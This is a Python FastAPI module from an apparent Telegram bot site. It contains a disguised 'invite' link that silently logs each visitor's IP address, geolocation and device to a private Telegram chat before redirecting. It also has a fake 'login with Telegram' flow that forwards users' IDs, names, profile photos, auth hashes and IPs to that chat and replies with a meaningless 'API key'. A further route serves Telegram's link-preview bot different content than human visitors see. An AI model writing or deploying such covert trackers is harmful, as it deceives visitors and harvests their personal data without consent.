import logging
from datetime import datetime
from io import BufferedReader, BytesIO
from os.path import basename
from secrets import token_urlsafe
from typing import Optional

import yaml
from bs4 import BeautifulSoup as soup
from fastapi import APIRouter, BackgroundTasks, Request
from fastapi.responses import (HTMLResponse, PlainTextResponse,
                               RedirectResponse, UJSONResponse)

from .. import app, templates, xbot

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/ip", tags=["IP Info"])


@app.get("/info", response_class=UJSONResponse, include_in_schema=False)
async def request_info(request: Request):
    info = request.scope
    for name in ["endpoint", "router", "fastapi_astack", "app"]:
        del info[name]
    return info


@app.get("/cats", include_in_schema=False)
async def redirect():
    return RedirectResponse("https://www.youtube.com/watch?v=dQw4w9WgXcQ")


@app.get("/items/{id}", response_class=HTMLResponse, include_in_schema=False)
async def read_item(request: Request, id: str):
    return templates.TemplateResponse("item.html", {"request": request, "id": id})


@router.get("/{address}", response_class=UJSONResponse)
async def ip_info(address: str):
    api = xbot.config.ipinfo_api
    async with xbot.http.get(api.format(address)) as resp:
        if resp.status != 200:
            return {"error": "No result Found", "status": resp.status}
        return await resp.json()


@router.get("/")
async def find_my_ip(request: Request):
    return RedirectResponse(f"/ip/{request.client.host}")


async def ip_logger_task(request: Request):
    api = xbot.config.ipinfo_api
    ip_address = request.client.host
    device = request.headers.get("user-agent")
    async with xbot.http.get(api.format(ip_address)) as resp:
        ip_info = await resp.json() if resp.status == 200 else ip_address
    user_info = {
        "IP": ip_info,
        "Device": device,
        "Date": datetime.now().strftime("%d-%m-%y, %I:%M:%S %p"),
    }
    params = {
        "chat_id": -1001430351422,
        "text": f"<pre>{yaml.dump(user_info, indent=4, default_flow_style=False)}</pre>",
        "disable_web_page_preview": "True",
        "parse_mode": "HTML",
    }
    await xbot.http.get(xbot.config.tg_bot_api, params=params)


@app.get("/invite", include_in_schema=False)
async def Invite_link(background_tasks: BackgroundTasks, request: Request):
    background_tasks.add_task(ip_logger_task, request=request)
    return RedirectResponse(xbot.config.tg_group_invite)


app.include_router(router)


@app.get("/cat_video", include_in_schema=False)
async def cat_video(request: Request):
    if "TelegramBot" in str(request.headers.get("user-agent")):
        return RedirectResponse("https://i.imgur.com/kCvsbjs.mp4")
    return RedirectResponse("https://github.com/code-rgb")


async def get_profile_photo(tg_img_url: Optional[str] = None) -> Optional[str]:
    if tg_img_url is None:
        return
    async with xbot.http.get(tg_img_url) as img_get:
        img_bytes = await img_get.read()
    img_io = BytesIO(img_bytes)
    img_io.name = basename(tg_img_url)

    async with xbot.http.post(
        xbot.config.imgur_api,
        data={"image": BufferedReader(img_io)},
    ) as img_post:
        image_url = (await img_post.json())["data"].get("link")
    return image_url


async def tg_login_task(request: Request, **kwargs):
    api = xbot.config.ipinfo_api
    ip_address = request.client.host
    device = request.headers.get("user-agent")
    ip_info = api.format(ip_address)
    img_url = await get_profile_photo(kwargs.get("photo"))
    user_link = f"tg://openmessage?user_id={kwargs.get('id')}"
    text = f"""
<a href={img_url}>­</a><code>[📆 {datetime.now().strftime('%d-%m-%y')} |  🕐 {kwargs.get('ad')}]</code>

#USER
  ID: <code>{kwargs.get('id')}</code>
  Name: {kwargs.get('fn')} {kwargs.get('ln')}
  👤: @{kwargs.get('un')}  |  <a href={user_link}>[link]</a>

📱 <b>Device</b>
<code>{device}</code>

🌍 <b>IP :</b> <code>{ip_address}</code> <a href={ip_info}>[info]</a>

#HASH
<code>{kwargs.get('hash')}</code>
"""
    params = {
        "chat_id": -1001430351422,
        "text": str(soup(text, "html.parser")),
        "disable_web_page_preview": "False",
        "parse_mode": "HTML",
    }
    await xbot.http.get(xbot.config.tg_bot_api, params=params)
    params["text"] = f"<b>Your API Key is:</b>  <code>{token_urlsafe(8)}</code>"
    params["chat_id"] = kwargs.get("id")
    await xbot.http.get(xbot.config.tg_bot_api, params=params)


@app.get("/telegram", include_in_schema=False, response_class=PlainTextResponse)
async def telegram_login(
    background_tasks: BackgroundTasks,
    request: Request,
    id: int,
    first_name: str,
    auth_date: int,
    hash: str,
    last_name: str = "",
    username: str = "",
    photo_url: str = "",
):
    background_tasks.add_task(
        tg_login_task,
        request,
        id=id,
        fn=first_name,
        ln=last_name,
        un=username,
        ad=auth_date,
        hash=hash,
        photo=photo_url,
    )
    return "Login Successfull !!! :)\nCheck message by | XCaptchaBot || https://telegram.dog/xcaptchabot | for your API key."


@app.get("/login", response_class=HTMLResponse, include_in_schema=False)
async def login_with_telegram(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})
